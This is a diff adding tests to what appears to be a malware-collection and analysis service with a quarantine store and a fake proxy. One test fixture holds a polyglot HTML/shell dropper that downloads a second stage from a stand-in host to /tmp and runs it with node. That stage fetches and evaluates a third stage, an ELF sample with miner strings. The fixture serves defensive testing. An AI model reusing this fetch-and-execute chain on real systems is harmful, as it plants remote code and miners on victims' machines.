@@ -367,6 +367,7 @@ async def add_pending(
 
 
 DL = "http://dl.example.test"
+WEB = {"html", "svg", "xml", "css", "json", "javascript"}
 STYLE = b"body{background:url(http://dl.example.test/bg.png)}a{color:red}p{margin:0}"
 INNER_PAGE = (
     b'<!doctype html><html><body><a href="http://dl.example.test/deeper.html">x</a></body></html>'
@@ -694,8 +695,77 @@ async def test_a_target_refused_as_web_parent_comes_back_when_a_script_links_it(
         await svc.step()
         await analyzer.step()  # the script links the refused URL: back in the queue
         assert [tuple(r) for r in await rows(owner, sql, u=f"{HOST}/old.js")] == [("pending", None)]
+        clock.now = datetime.now(UTC) + timedelta(minutes=1)  # the database set the time itself
         await svc.step()
     assert f"{HOST}/old.js" in {u for u, _ in proxy.seen}
+
+
+async def test_a_reopened_file_whose_analysis_fails_is_attacker_content(
+    owner: AsyncEngine, factories: Any, tmp_path: Path
+) -> None:
+    coll_f, ana_f = factories
+    s = settings(tmp_path)
+    store = Quarantine(s.quarantine_dir)
+    store.prepare()
+    files = {f"{HOST}/index.html": Reply(body=LINKED_PAGE), f"{DL}/site.css": Reply(body=STYLE)}
+    proxy = FakeProxy(handler_for(files))
+    await add_indicator(owner, f"{HOST}/index.html")
+    async with proxy.running():
+        gate = await open_gate(proxy.url)
+        clock = Clock()
+        svc = CollectorService(s, coll_f, store, gate, clock=clock)
+        analyzer = AnalyzerService(s, ana_f, store, clock=clock)
+        await svc.step()
+        await analyzer.step()
+        await svc.step()
+        await analyzer.step()
+        css = await sample_of(owner, f"{DL}/site.css")
+        assert css.spared and css.sha256 not in await hashes(owner)
+        # The file is gone from quarantine when an attacker asks for it: the new analysis fails.
+        store.remove(css.sha256)
+        await add_indicator(owner, f"{DL}/site.css")
+        await svc.step()
+        assert await analyzer.step() == 1
+    again = await sample_of(owner, f"{DL}/site.css")
+    assert (again.analysis_status, again.spared) == ("failed", False)
+    assert css.sha256 in await hashes(owner)
+
+
+async def test_the_polyglot_chain_reaches_its_third_stage(
+    owner: AsyncEngine, factories: Any, tmp_path: Path
+) -> None:
+    coll_f, ana_f = factories
+    s = settings(tmp_path)
+    store = Quarantine(s.quarantine_dir)
+    store.prepare()
+    polyglot = (
+        b'<b x\nsrc="http://dl.example.test/s2.js"\npython3 - "$src" <<\'E\'\n'
+        b"import sys,urllib.request as r\n"
+        b'open("/tmp/s","wb").write(r.urlopen(sys.argv[1]).read())\nE\nnode /tmp/s\n'
+    )
+    stage = (
+        b'fetch("http://dl.example.test/s3").then(r=>r.text()).then(t=>(()=>0).constructor(t)())'
+    )
+    files = {
+        f"{HOST}/p.html": Reply(body=polyglot),
+        f"{DL}/s2.js": Reply(body=stage),
+        f"{DL}/s3": Reply(body=tiny_elf_with_miner_strings()),
+    }
+    proxy = FakeProxy(handler_for(files))
+    await add_indicator(owner, f"{HOST}/p.html")
+    async with proxy.running():
+        gate = await open_gate(proxy.url)
+        clock = Clock()
+        svc = CollectorService(s, coll_f, store, gate, clock=clock)
+        analyzer = AnalyzerService(s, ana_f, store, clock=clock)
+        for _ in range(3):
+            await svc.step()
+            await analyzer.step()
+            clock.now += timedelta(minutes=1)
+    assert [u for u, _ in proxy.seen] == [f"{HOST}/p.html", f"{DL}/s2.js", f"{DL}/s3"]
+    first, second = await sample_of(owner, f"{HOST}/p.html"), await sample_of(owner, f"{DL}/s2.js")
+    assert first.kind not in WEB and second.kind not in WEB
+    assert {first.sha256, second.sha256} <= await hashes(owner)
 
 
 async def test_a_target_queued_from_a_crawled_page_is_not_fetched(
